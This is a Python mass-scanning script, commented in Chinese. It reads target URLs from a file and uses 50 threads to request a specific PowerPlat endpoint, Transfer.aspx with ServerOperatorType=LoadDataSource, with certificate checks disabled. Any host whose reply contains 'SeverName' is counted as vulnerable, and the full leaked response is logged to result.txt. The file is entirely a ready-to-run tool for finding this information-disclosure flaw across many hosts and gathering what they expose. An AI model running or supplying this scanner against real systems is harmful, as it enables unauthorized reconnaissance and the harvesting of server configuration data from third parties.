import requests
import threading
from urllib.parse import urljoin
import urllib3
import sys

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class VulnerabilityScanner:
    def __init__(self, thread_count=50):
        self.thread_count = thread_count
        self.lock = threading.Lock()
        self.results_file = "result.txt"
        
    def check_url(self, url):
        try:
            target_url = urljoin(url.strip(), "/PowerPlat/Tools/Transfer.aspx?ServerOperatorType=LoadDataSource")
            response = requests.get(
                target_url, 
                verify=False,
                timeout=10,
                allow_redirects=False  # 不自动重定向
            )
            
            # 检查状态码和响应内容
            status_code = response.status_code
            
            if 300 <= status_code < 400:
                print(f"[INFO] {url} - 状态码 {status_code}，漏洞不存在")
                return False, url, status_code, ""
                
            elif status_code == 200:
                response_text = response.text
                if "SeverName" in response_text:
                    # 漏洞存在
                    return True, url, status_code, response_text
                else:
                    print(f"[INFO] {url} - 状态码 200，但响应中未包含SeverName，漏洞不存在")
                    return False, url, status_code, response_text
            else:
                print(f"[INFO] {url} - 状态码 {status_code}，漏洞不存在")
                return False, url, status_code, response.text
                
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] {url} - 请求失败: {str(e)}")
            return False, url, 0, str(e)
        except Exception as e:
            print(f"[ERROR] {url} - 发生未知错误: {str(e)}")
            return False, url, 0, str(e)
    
    def worker(self, urls):
        for url in urls:
            is_vulnerable, checked_url, status_code, response_data = self.check_url(url)
            
            if is_vulnerable:
                with self.lock:
                    with open(self.results_file, "a", encoding="utf-8") as f:
                        f.write(f"漏洞URL: {checked_url}\n")
                        f.write(f"状态码: {status_code}\n")
                        f.write(f"响应数据: {response_data}\n")
                        f.write("-" * 50 + "\n")
                    print(f"[VULNERABLE] {checked_url} - 发现漏洞，已写入结果文件")
    
    def scan(self, url_file):
        try:
            # 读取URL列表
            with open(url_file, "r", encoding="utf-8") as f:
                urls = [line.strip() for line in f if line.strip()]
            
            if not urls:
                print("未找到有效的URL")
                return
            
            print(f"开始扫描，共 {len(urls)} 个URL，线程数: {self.thread_count}")
            
            # 清空或创建结果文件
            open(self.results_file, "w").close()
            
            # 分配任务给线程
            chunk_size = max(1, len(urls) // self.thread_count)
            threads = []
            
            for i in range(0, len(urls), chunk_size):
                chunk = urls[i:i + chunk_size]
                thread = threading.Thread(target=self.worker, args=(chunk,))
                threads.append(thread)
                thread.start()
            
            # 等待所有线程完成
            for thread in threads:
                thread.join()
                
            print("扫描完成")
            
        except FileNotFoundError:
            print(f"错误: 文件 {url_file} 不存在")
        except Exception as e:
            print(f"扫描过程中发生错误: {str(e)}")

def main():
    # 设置线程数
    thread_count = 50
    
    # 创建扫描器实例
    scanner = VulnerabilityScanner(thread_count)
    
    # 开始扫描
    scanner.scan("url.txt")

if __name__ == "__main__":
    main()